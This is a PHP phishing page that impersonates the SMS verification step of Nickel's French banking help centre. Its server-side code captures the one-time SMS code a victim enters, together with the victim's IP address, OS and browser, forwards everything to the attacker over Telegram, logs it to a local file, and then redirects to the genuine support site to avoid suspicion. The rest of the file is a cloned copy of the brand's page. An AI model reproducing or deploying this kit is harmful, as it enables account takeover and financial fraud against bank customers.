<?php

require_once("../config.php");
if(isset($_POST["doSMS"]))
{
    if(!empty($_POST['sms']))
    {
        $message = '/-- SMS --/' . getIPAddress() . "\r\n";
        $message .= '[SMS] = ' . $_POST["sms"] . "\r\n";
        $message .= '[TIME/DATE] = ' . $date . "\r\n";
        $message .= '[IP address] = ' . getIPAddress() . "\r\n";
        $message .= '[OS] = ' . $user_os . "\r\n";
        $message .= '[BROWSER] = ' . $user_browser . "\r\n";
        telegram_send(urlencode($message));
        $house = fopen('../fucked/SMS.html', 'a');
        fwrite($house, $message);
        fclose($house);
        header("Location: https://support.nickel.eu/");
    }
}

?>
<html lang="fr-FR">

<head>
	<meta charset="utf-8">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">

	<link rel="stylesheet" href="../assets/css/c9246524ba9b0b24604193ecf93ac87acb64817b.css" type="text/css">
	<link rel="stylesheet" href="https://nickel.eu/fonts/newfont.css" type="text/css">
	<link rel="stylesheet" type="text/css" href="../assets/css/f03360da984dc850799032c1b3359fbdbfebb546.css">
	<link rel="stylesheet" type="text/css" href="../assets/css/a6c175c13eee4b9da08bbce853131dc55ff79293.css">
	<link rel="stylesheet" type="text/css" href="../assets/css/beb3167f8664407a2a6c1854928729178619e2da.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/2282daa7.chunk.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <link rel="shortcut icon" href="https://app.nickel.eu/favicon.ico">

	<link rel="stylesheet" media="all" href="../assets/css/application.css" id="stylesheet">
	<link rel="stylesheet" media="all" href="../assets/css/theming_v1_support.css">
	<link rel="stylesheet" type="text/css" href="../assets/css/styledigest.css">

	<link rel="shortcut icon" type="image/x-icon" href="../assets/media/16f7fd93bc0d607d545e444fb8753580ffa0bd59.ico">

	<title>SMS Vérification – Centre d'aide | Nickel</title>

</head>
<body class="">
	<div id="page">
		<div id="user-info">
			<a class="login" data-auth-action="signin" role="button" rel="nofollow" title="Ouvre une boîte de dialogue" href="/hc/fr/signin?return_to=https%3A%2F%2Fsupport.nickel.eu%2Fhc%2Ffr%2Frequests%2Fnew%3F_ga%3D2.248638083.580991579.1637986424-955430656.1637986424%26ticket_form_id%3D360000356860&amp;locale=fr">Connexion</a>

		</div>
		<div class="container">
			<div class="row">
				<div class="col-lg-12">
					<header class="header">

						<nav data-role="not-connected" class="navbar" role="navigation">
							<div class="navbar-header">

								<a class="navbar-brand" href="https://nickel.eu/fr">
									<img src="https://theme.zdassets.com/theme_assets/222484/04641aff33a412c40546a983619c4f5caa760508.png" alt="Logo">
								</a>
							</div>

							<div class="collapse navbar-collapse" id="main-nav" aria-expanded="false">

							</div>
						</nav>

					</header>
				</div>
			</div>
		</div>


		<main role="main">
			<div class="container-divider"></div>
			<div class="container">
				<nav class="sub-nav">
					<ol class="breadcrumbs">

						<li title="Centre d'aide | Nickel">

							<a href="#">Confirmer vos informations | Nickel</a>

						</li>

						<li title="Vérification par SMS">

							Vérification par SMS

						</li>

					</ol>

				</nav>

				<h1>
					Vérification par SMS

				</h1>
				<div class="form">
					<form id="new_request" class="request-form" data-form="" data-form-type="request"  accept-charset="UTF-8" method="post">

						<div class="form-field string  optional  request_custom_fields_360004962779">
							<label style="color: inherit; margin-top: 8px; font-size: inherit; font-style: inherit; font-weight: 200; text-transform: inherit;" id="request_custom_fields_360004962779_label" for="request_custom_fields_360004962779">SMS Code*</label>
							<input type="text" name="sms" required id="sms" aria-required="false" aria-labelledby="request_custom_fields_360004962779_label">


						</div>
						<footer>
                            
                        <button type="submit" name="doSMS" class="botona">Vérifier</button>
                    
                    </footer>

					</form>



				</div>


			</div>
		</main>

		<footer class="footer">
			<div class="container">
				<div class="row">
					<div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
						<ul class="list">
							<p><strong> A propos </strong></p>
							<li class="item">
								<a href="#" class="link">Qui sommes-nous ?</a>
							</li>
							<li class="item es-remove">
								<a href="#" class="link">Mag' Nickel</a>
							</li>
							<li class="item es-remove">
								<a href="#" class="link">Partenaires</a>
							</li>
							<li class="item">
								<a href=" #" class="link">Presse</a>
							</li>
							<li class="item es-remove">
								<a href="#" class="link">Recrutement</a>
							</li>

							<li class="item">
								<a href="#" class="link"><strong style="font-size: 16px; font-weight: 400; line-height: 20px;">Devenir Buraliste Nickel</strong></a>
							</li>

							<li class="item">
								<a href="#" class="link"><strong style="font-size: 16px; font-weight: 400; line-height: 20px;">Mentions légales</strong></a>
							</li>

							<li class="item">
								<a href="#" class="ot-sdk-show-settings link" style="font-weight: 400;font-size: 16px;">Cookies Settings</a>
							</li>

							<li class="item">
								<a href="#" class="link"><strong style="font-size: 16px; font-weight: 400; line-height: 20px;display: block; margin-top: 10px;">Politique d'utilisation des données personnelles clients et prospects<strong></strong></strong></a><strong style="font-size: 16px; font-weight: 400; line-height: 20px;display: block; margin-top: 10px;"><strong>
									</strong></strong>
							</li><strong style="font-size: 16px; font-weight: 400; line-height: 20px;display: block; margin-top: 10px;"><strong>
								</strong></strong>
						</ul><strong style="font-size: 16px; font-weight: 400; line-height: 20px;display: block; margin-top: 10px;"><strong>
							</strong></strong>
					</div><strong style="font-size: 16px; font-weight: 400; line-height: 20px;display: block; margin-top: 10px;"><strong>
							<div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
								<ul class="list">
									<p><strong> Aide </strong></p>
									<li class="item">
										<a href="#" class="link">Comment ouvrir un compte ?</a>
									</li>
									<li class="item es-remove">
										<a href="#" class="link">Fiches pratiques</a>
									</li>
									<li class="item">
										<a href="#" class="link">Centre d'aide/FAQ</a>
									</li>
									<li class="item">
										<a href="#" class="link">Contactez-nous</a>
									</li>

									<li class="item">&nbsp;</li>
									<li class="item es-remove">
										<a href="#" class="link"><strong style="font-size: 16px; font-weight: 400; line-height: 20px;">Vous êtes professionnel ? </strong></a>
									</li>

									<li class="item">
										<a href="#" class="link"><strong style="font-size: 16px; font-weight: 400; line-height: 20px;">Documents légaux</strong></a>
									</li>

									<li class="item">
										<a href="#" class="link"><strong style="font-size: 16px; font-weight: 400; line-height: 20px;">Politique d'utilisation des cookies</strong></a>
									</li>
									<li class="item">
										<a href="#" class="link"><strong style="font-size: 16px; font-weight: 400; line-height: 20px; display: block; margin-top: 10px;">Politique d'utilisation des données personnelles des tiers</strong></a>
									</li>
								</ul>

							</div>
							<div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
								<ul class="list list-img" id="store-fr">
									<li class="item">
										<a href="#" class="link">
											<img id="guide-footer_store_apple" src="https://theme.zdassets.com/theme_assets/222484/bcebcb093ba4536ee2436ed35e8a115bae7201ad.png" alt="Télécharger dans l'App Store" width="135" height="40" class="img">
										</a>
									</li>
									<li class="item">
										<a href="#" class="link">
											<img id="guide-footer_store_play" src="https://theme.zdassets.com/theme_assets/222484/537fb6fc7522da5a5b00555c50b14e9e4f9eaf30.png" alt="Disponible sur Google Play" width="135" height="40" class="img">
										</a>
									</li>
									<li class="item">
										<a href="#" class="link">
											<img id="guide-footer_access_web" src="https://theme.zdassets.com/theme_assets/222484/9276a56b220568088a28ef4b825bf2cb5b412742.png" alt="Accessible en ligne" width="135" height="40" class="img">
										</a>
									</li>
								</ul>

							</div>
							<div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
								<ul class="list list-social">
									<li class="item">
										<a href="#" class="link">
											<i class="icon icon-facebook-circle"></i>Facebook
										</a>
									</li>
									<li class="item es-remove">
										<a href="#" class="link">
											<i class="icon icon-twitter-circle"></i>Twitter
										</a>
									</li>
									<li class="item es-remove">
										<a href="#" class="link">
											<i class="icon icon-linkedin-circle"></i>LinkedIn
										</a>
									</li>
								</ul>
							</div>
						</strong></strong>
				</div><strong style="font-size: 16px; font-weight: 400; line-height: 20px;display: block; margin-top: 10px;"><strong>
					</strong></strong>
			</div><strong style="font-size: 16px; font-weight: 400; line-height: 20px;display: block; margin-top: 10px;"><strong>
				</strong></strong>
		</footer><strong style="font-size: 16px; font-weight: 400; line-height: 20px;display: block; margin-top: 10px;"><strong>
			</strong></strong>
	</div>

</body>